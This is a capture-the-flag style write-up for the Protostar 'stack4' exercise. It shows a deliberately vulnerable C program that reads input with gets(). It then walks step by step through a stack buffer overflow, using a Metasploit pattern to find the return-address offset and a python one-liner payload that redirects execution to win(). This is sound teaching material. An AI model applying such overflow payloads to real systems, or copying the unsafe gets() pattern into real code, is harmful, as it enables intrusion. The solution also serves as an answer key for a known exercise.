#### Stack4

###### About

- Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
- This level is at ``/opt/protostar/bin/stack4``
- Hints
	- A variety of introductory papers into buffer overflows may help.
	- gdb lets you do ``run < input``
	- EIP is not directly after the end of buffer, compiler padding can also increase the size.

```stack4.c```

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

###### Solution

```sh
user@protostar:/opt/protostar/bin$ ./stack4
AAAA
user@protostar:/opt/protostar/bin$
```

```sh
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
root@kali:~#
```

```sh
user@protostar:/opt/protostar/bin$ ./stack4
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Segmentation fault
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" > /tmp/pay
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack4 -q
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) r < /tmp/pay
Starting program: /opt/protostar/bin/stack4 < /tmp/pay

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb)
```

```sh
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 63413563
[*] Exact match at offset 76
root@kali:~#
```

```sh
user@protostar:/opt/protostar/bin$ objdump -d stack4 | grep win
080483f4 <win>:
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'A'*76 +'\xf4\x83\x04\x08'" | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$
```